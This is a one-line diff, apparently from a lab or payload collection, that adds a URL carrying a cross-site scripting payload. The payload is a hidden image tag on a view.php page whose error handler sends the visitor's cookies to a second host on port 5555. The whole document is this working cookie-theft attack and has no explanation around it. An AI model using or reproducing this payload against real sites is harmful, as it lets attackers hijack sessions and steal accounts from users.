@@ -1,0 +1,1 @@
+http://192.168.1.203:80/view.php#user=<img src=x style="display:none" onerror="new Image().src='http://192.168.1.201:5555/?cookieId1234='+document.cookie">
